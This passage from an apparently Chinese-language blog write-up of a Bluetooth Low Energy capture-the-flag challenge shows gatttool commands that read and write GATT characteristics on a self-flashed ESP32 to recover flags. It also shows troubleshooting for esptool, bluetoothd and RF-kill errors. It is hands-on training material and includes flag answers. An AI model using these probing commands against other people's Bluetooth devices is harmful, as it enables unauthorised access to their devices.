0000</td><td>扩展属性</td></tr><tr><td>那么要关注的属性就是</td><td></td><td></td><td></td></tr><tr><td>扩展属性、notify、write、read、broadcast</td><td></td><td></td><td></td></tr><tr><td>一个个看</td><td></td><td></td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0054 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">So many properties!</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write -a 0x0054 -n 01 --listen</span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0054 -n 01 --listen</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">Notification handle = 0x0054 value: 30 37 65 34 61 30 63 63 34 38 </span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0054 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">fbb966958f</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo &quot;30 37 65 34 61 30 63 63 34 38 &quot; | tr -d &#x27; &#x27; | xxd -r -p </span><br><span class="line">07e4a0cc48  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接起来就好了<code>fbb966958f07e4a0cc48</code><br>这里运用的指令都是前面出现过的，还记得怎么用就行</p><h2 id="0x20"><a href="#0x20" class="headerlink" title="0x20"></a>0x20</h2><p>%% 找出作者的 twitter 句柄并按照 0x0056 告诉您的去做！ %%</p><p>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>作者的twitter是hackgnar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">md5 of author&#x27;s twitter handle</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo -n &quot;hackgnar&quot; | md5sum</span><br><span class="line">fe40eb2449bda7f9a997331ac09424e7  -</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x0056 -n $(echo -n &quot;fe40eb2449bda7f9a997&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x0056 | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br><span class="line">fe40eb2449bda7f9a997</span><br><span class="line">                      </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是答案是<code>d953bfb9846acc2e15ee</code><br>这个答案只有前20个字符又很难还原最初的是什么</p><h2 id="记录报错"><a href="#记录报错" class="headerlink" title="记录报错"></a>记录报错</h2><h3 id="安装时报错"><a href="#安装时报错" class="headerlink" title="安装时报错"></a>安装时报错</h3><p>直接使用系统的esptool可能会报错（指安装途径为<code>sudo apt-get install esptool</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]</span><br><span class="line">└─$ esptool -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin</span><br><span class="line"></span><br><span class="line">esptool.py v4.7.0</span><br><span class="line">Serial port /dev/ttyUSB0</span><br><span class="line">Connecting....</span><br><span class="line">Chip is ESP32-D0WDQ6 (revision v1.1)</span><br><span class="line">Features: WiFi, BT, Dual Core, 240MHz, VRef calibration in efuse, Coding Scheme None</span><br><span class="line">Crystal is 40MHz</span><br><span class="line">MAC: 8c:4f:00:c8:78:60</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/bin/esptool&quot;, line 37, in &lt;module&gt;</span><br><span class="line">    esptool._main()</span><br><span class="line">    ~~~~~~~~~~~~~^^</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/esptool/__init__.py&quot;, line 1139, in _main</span><br><span class="line">    main()</span><br><span class="line">    ~~~~^^</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/esptool/__init__.py&quot;, line 751, in main</span><br><span class="line">    esp = esp.run_stub()</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/esptool/loader.py&quot;, line 996, in run_stub</span><br><span class="line">    stub = StubFlasher(get_stub_json_path(self.CHIP_NAME))</span><br><span class="line">  File &quot;/usr/lib/python3/dist-packages/esptool/loader.py&quot;, line 159, in __init__</span><br><span class="line">    with open(json_path) as json_file:</span><br><span class="line">         ~~~~^^^^^^^^^^^</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: &#x27;/usr/lib/python3/dist-packages/esptool/targets/stub_flasher/stub_flasher_32.json&#x27;                                                </span><br><span class="line">                                                 </span><br></pre></td></tr></table></figure><p>安装esptool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install esptool -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后从git安装esptool.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/espressif/esptool.git</span><br></pre></td></tr></table></figure><p>尝试启动esptool.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -h   </span><br></pre></td></tr></table></figure><p>如果报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]</span><br><span class="line">└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -h</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/kali/Desktop/esptool/esptool.py&quot;, line 34, in &lt;module&gt;</span><br><span class="line">    import esptool</span><br><span class="line">  File &quot;/home/kali/Desktop/esptool/esptool/__init__.py&quot;, line 41, in &lt;module&gt;</span><br><span class="line">    import rich_click as click</span><br><span class="line">ModuleNotFoundError: No module named &#x27;rich_click&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就去安装这个缺少的库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install rich-click -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>接着就可以直接运行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"> ┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]</span><br><span class="line">└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -h                 </span><br><span class="line">                                                                                             </span><br><span class="line"> Usage: esptool.py [OPTIONS] COMMAND [ARGS]...                                               </span><br><span class="line">                                                                                             </span><br><span class="line"> esptool.py v4.8.1 - serial utility for flashing, provisioning, and interacting with         </span><br><span class="line"> Espressif SoCs.                                                                             </span><br><span class="line">                                                                                             </span><br><span class="line">╭─ Options ─────────────────────────────────────────────────────────────────────────────────╮</span><br><span class="line">│ --chip              -c  [auto|esp8266|esp32|esp32s2|esp  Target chip type.                │</span><br><span class="line">│                         32s3|esp32c3|esp32c2|esp32c6|es                                   │</span><br><span class="line">│                         p32c61|esp32c5|esp32h2|esp32h21                                   │</span><br><span class="line">│                         |esp32p4|esp32h4]                                                 │</span><br><span class="line">│ --port              -p  TEXT                             Serial port device.              │</span><br><span class="line">│ --baud              -b  INTEGER                          Serial port baud rate used when  │</span><br><span class="line">│                                                          flashing/reading.                │</span><br><span class="line">│ --port-filter           [TEXT]                           Serial port device filter, can   │</span><br><span class="line">│                                                          be vid=NUMBER, pid=NUMBER,       │</span><br><span class="line">│                                                          name=SUBSTRING,                  │</span><br><span class="line">│                                                          serial=SUBSTRING.                │</span><br><span class="line">│ --before                [default-reset|usb-reset|no-res  Which reset to perform before    │</span><br><span class="line">│                         et|no-reset-no-sync]             connecting to the chip.          │</span><br><span class="line">│ --after             -a  [hard-reset|soft-reset|no-reset  Which reset to perform after     │</span><br><span class="line">│                         |no-reset-stub|watchdog-reset]   operation is finished.           │</span><br><span class="line">│ --no-stub                                                Disable launching the flasher    │</span><br><span class="line">│                                                          stub, only talk to ROM           │</span><br><span class="line">│                                                          bootloader. Some features will   │</span><br><span class="line">│                                                          not be available.                │</span><br><span class="line">│ --trace             -t                                   Enable trace-level output of     │</span><br><span class="line">│                                                          esptool.py interactions.         │</span><br><span class="line">│ --override-vddsdio      [1.8V|1.9V|OFF]                  Override ESP32 VDDSDIO internal  │</span><br><span class="line">│                                                          voltage regulator (use with      │</span><br><span class="line">│                                                          care).                           │</span><br><span class="line">│ --connect-attempts      INTEGER                          Number of attempts to connect,   │</span><br><span class="line">│                                                          negative or 0 for infinite.      │</span><br><span class="line">│                                                          Default: 7.                      │</span><br><span class="line">│ --help              -h                                   Show this message and exit.      │</span><br><span class="line">╰───────────────────────────────────────────────────────────────────────────────────────────╯</span><br><span class="line">╭─ Basic commands ──────────────────────────────────────────────────────────────────────────╮</span><br><span class="line">│ write-flash             Write a binary blob to flash. The address is followed by binary   │</span><br><span class="line">│                         filename, separated by space.                                     │</span><br><span class="line">│ read-flash              Read SPI flash memory content.                                    │</span><br><span class="line">│ erase-flash             Erase the SPI flash memory.                                       │</span><br><span class="line">│ erase-region            Erase a region of the SPI flash memory.                           │</span><br><span class="line">│ read-mac                Print the device MAC address.                                     │</span><br><span class="line">│ flash-id                Print the SPI flash memory manufacturer and device ID.            │</span><br><span class="line">│ elf2image               Create an application image from ELF file                         │</span><br><span class="line">│ image-info              Print information about a firmware image (bootloader or           │</span><br><span class="line">│                         application).                                                     │</span><br><span class="line">│ merge-bin               Merge multiple raw binary files into a single flashable file.     │</span><br><span class="line">│ version                 Print esptool version.                                            │</span><br><span class="line">╰───────────────────────────────────────────────────────────────────────────────────────────╯</span><br><span class="line">╭─ Advanced commands ───────────────────────────────────────────────────────────────────────╮</span><br><span class="line">│ verify-flash            Verify a binary blob against the flash memory content.            │</span><br><span class="line">│ load-ram                Download an image to RAM and execute.                             │</span><br><span class="line">│ dump-mem                Dump arbitrary memory to a file.                                  │</span><br><span class="line">│ read-mem                Read arbitrary memory location.                                   │</span><br><span class="line">│ write-mem               Modify or write to arbitrary memory location.                     │</span><br><span class="line">│ read-flash-status       Read SPI flash memory status register.                            │</span><br><span class="line">│ write-flash-status      Write SPI flash memory status register.                           │</span><br><span class="line">│ read-flash-sfdp         Read SPI flash SFDP (Serial Flash Discoverable Parameters).       │</span><br><span class="line">│ get-security-info       Print security information report.                                │</span><br><span class="line">│ chip-id                 Print the device chip ID.                                         │</span><br><span class="line">│ run                     Run application code loaded in flash.                             │</span><br><span class="line">╰───────────────────────────────────────────────────────────────────────────────────────────╯</span><br><span class="line"></span><br><span class="line">                                                                                             </span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]</span><br><span class="line">└─$ python &#x27;/home/kali/Desktop/esptool/esptool.py&#x27; -p /dev/ttyUSB0 -b 460800 --before default_reset --after hard_reset --chip esp32  write_flash --flash_mode dio --flash_size 2MB --flash_freq 40m 0x1000 build/bootloader/bootloader.bin 0x8000 build/partition_table/partition-table.bin 0x10000 build/ble_ctf.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning: Deprecated: Option &#x27;--flash_mode&#x27; is deprecated. Use &#x27;--flash-mode&#x27; instead.</span><br><span class="line">Warning: Deprecated: Option &#x27;--flash_size&#x27; is deprecated. Use &#x27;--flash-size&#x27; instead.</span><br><span class="line">Warning: Deprecated: Option &#x27;--flash_freq&#x27; is deprecated. Use &#x27;--flash-freq&#x27; instead.</span><br><span class="line">Warning: Deprecated: Choice &#x27;default_reset&#x27; for option &#x27;--before&#x27; is deprecated. Use &#x27;default-reset&#x27; instead.</span><br><span class="line">Warning: Deprecated: Choice &#x27;hard_reset&#x27; for option &#x27;--after&#x27; is deprecated. Use &#x27;hard-reset&#x27; instead.</span><br><span class="line">Warning: Deprecated: Command &#x27;write_flash&#x27; is deprecated. Use &#x27;write-flash&#x27; instead.</span><br><span class="line">esptool.py v4.8.1</span><br><span class="line">Connected to ESP32 on /dev/ttyUSB0:</span><br><span class="line">Chip type:          ESP32-D0WDQ6 (revision v1.1)</span><br><span class="line">Features:           Wi-Fi, BT, Dual Core + LP Core, 240MHz, Vref calibration in eFuse, Coding Scheme None</span><br><span class="line">Crystal frequency:  40MHz</span><br><span class="line">MAC:                8c:4f:00:c8:78:60</span><br><span class="line"></span><br><span class="line">Stub flasher running.</span><br><span class="line">Changing baud rate to 460800...</span><br><span class="line">Changed.</span><br><span class="line"></span><br><span class="line">Configuring flash size...</span><br><span class="line">Flash will be erased from 0x00001000 to 0x00007fff...</span><br><span class="line">Flash will be erased from 0x00008000 to 0x00008fff...</span><br><span class="line">Flash will be erased from 0x00010000 to 0x000cafff...</span><br><span class="line">SHA digest in image updated.</span><br><span class="line">Wrote 26464 bytes (16501 compressed) at 0x00001000 in 0.7 seconds (299.5 kbit/s).</span><br><span class="line">Hash of data verified.</span><br><span class="line">Wrote 3072 bytes (103 compressed) at 0x00008000 in 0.0 seconds (538.0 kbit/s).</span><br><span class="line">Hash of data verified.</span><br><span class="line">Wrote 765904 bytes (452895 compressed) at 0x00010000 in 11.0 seconds (559.3 kbit/s).</span><br><span class="line">Hash of data verified.</span><br><span class="line"></span><br><span class="line">Hard resetting via RTS pin...</span><br><span class="line">                                                                                             </span><br><span class="line">┌──(myenv)─(kali㉿kali)-[~/Desktop/ble_ctf]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Connection-refused-111"><a href="#Connection-refused-111" class="headerlink" title="Connection refused (111)"></a>Connection refused (111)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">connect to 64:B7:08:61:B9:7E: Connection refused (111)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">connect to 64:B7:08:61:B9:7E: Connection refused (111)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先是排查功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo hciconfig hci0 lestates</span><br><span class="line">sudo hcitool lescan</span><br></pre></td></tr></table></figure><p>均正常输出</p><p>使用bluetooth进行交互</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查 bluetoothd 状态</span></span><br><span class="line">sudo systemctl status bluetooth</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动它</span></span><br><span class="line">sudo systemctl start bluetooth  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启它</span></span><br><span class="line">sudo systemctl restart bluetooth</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行它</span></span><br><span class="line">sudo bluetoothctl</span><br></pre></td></tr></table></figure><p>尝试进行交互</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo bluetoothctl                                       </span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Agent registered</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">connect 64:B7:08:61:B9:7E</span></span><br><span class="line">Device 64:B7:08:61:B9:7E not available</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">SetDiscoveryFilter success</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Failed to start discovery: org.bluez.Error.InProgress</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在旁边另开一个终端，使用btmon进行底层HCI的查看<br>得到的部分日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@ MGMT Event: Command Complete (0x0001) plen 263  &#123;0x0001&#125; [hci0] 461.113935</span><br><span class="line">      Set Local Name (0x000f) plen 260</span><br><span class="line">        Status: Success (0x00)</span><br><span class="line">        Name: kali</span><br><span class="line">        Short name: </span><br><span class="line">bluetoothctl[24851]: @ MGMT..pen (privileged) version 1.23   &#123;0x0002&#125; 522.145845</span><br><span class="line">bluetoothctl[24851]: @ MGMT Close: bluetoothctl          &#123;0x0002&#125; 839.044348                                                   </span><br><span class="line">@ MGMT Event: Connect Failed (0x000d) plen 8      &#123;0x0001&#125; [hci0] 850.944326                                                   </span><br><span class="line">        LE Address: 64:B7:08:61:B9:7E (Espressif Inc.)                                                                         </span><br><span class="line">        Status: Disconnected (0x0e)                                                                                            </span><br><span class="line">@ MGMT Event: Connect Failed (0x000d) plen 8      &#123;0x0001&#125; [hci0] 897.298500                                                   </span><br><span class="line">        LE Address: 64:B7:08:61:B9:7E (Espressif Inc.)                                                                         </span><br><span class="line">        Status: Disconnected (0x0e)                                                                                            </span><br><span class="line">bluetoothctl[27969]: @ MGMT..pen (privileged) version 1.23   &#123;0x0002&#125; 901.948847                                               </span><br><span class="line">scanbluetoothd[24308]: @ MGMT Comm..d (0x0023) plen 1  &#123;0x0001&#125; [hci0] 919.350036                                              </span><br><span class="line">        Address type: 0x07                                                                                                     </span><br><span class="line">          BR/EDR                                                                                                               </span><br><span class="line">          LE Public                                                                                                            </span><br><span class="line">          LE Random</span><br><span class="line">@ MGMT Event: Command Complete (0x0001) plen 4    &#123;0x0001&#125; [hci0] 919.350060</span><br><span class="line">      Start Discovery (0x0023) plen 1</span><br><span class="line">        Status: Busy (0x0a)</span><br><span class="line">        Address type: 0x07</span><br><span class="line">          BR/EDR</span><br><span class="line">          LE Public</span><br><span class="line">          LE Random</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给出的解决措施是重启蓝牙服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop bluetooth  # Stop the service first</span><br><span class="line">sleep 2                     # Give it a second to shut down</span><br><span class="line">sudo systemctl start bluetooth # Start it fresh</span><br><span class="line">sudo systemctl status bluetooth # Verify it&#x27;s active (running)</span><br></pre></td></tr></table></figure><p>还有蓝牙适配器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo hciconfig hci0 down</span><br><span class="line">sudo hciconfig hci0 up</span><br></pre></td></tr></table></figure><p>一顿重启后终于成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo bluetoothctl</span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Agent registered</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">scan on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">SetDiscoveryFilter success</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">hci0 <span class="built_in">type</span> 7 discovering on</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">Discovery started</span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[CHG] Controller 84:E0:F4:03:0F:5E Discovering: <span class="built_in">yes</span></span></span><br><span class="line"><span class="meta prompt_">[bluetooth]# </span><span class="language-bash">[NEW] Device 64:B7:08:61:B9:7E BLECTF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Operation-not-possible-due-to-RF-kill-132"><a href="#Operation-not-possible-due-to-RF-kill-132" class="headerlink" title="Operation not possible due to RF-kill (132)"></a>Operation not possible due to RF-kill (132)</h3><p>报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo hciconfig hci0 up  </span><br><span class="line">Can&#x27;t init device hci0: Operation not possible due to RF-kill (132)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查蓝牙状况</span></span><br><span class="line">sudo rfkill list bluetooth</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解除软件阻塞 (Soft blocked):如果显示 <span class="string">&quot;Soft blocked: yes&quot;</span></span></span><br><span class="line">sudo rfkill unblock bluetooth</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解除所有类型的阻塞</span></span><br><span class="line">sudo rfkill unblock all</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>处理硬件阻塞 (Hard blocked):</strong> 如果显示 “Hard blocked: yes”，这意味着有一个<strong>物理开关</strong>（通常在笔记本电脑的侧面、前面或通过 Fn 组合键）关闭了蓝牙。你需要找到这个开关并<strong>物理上打开它</strong>。软件命令 (rfkill unblock) 无法解除硬件阻塞。</p><p>之后把蓝牙拔了又重新插回去就好了，重启大法妙呀（）</p><h3 id="Device-or-resource-busy-16"><a href="#Device-or-resource-busy-16" class="headerlink" title="Device or resource busy (16)"></a>Device or resource busy (16)</h3><figure class="highlight shell"><table><tr><td 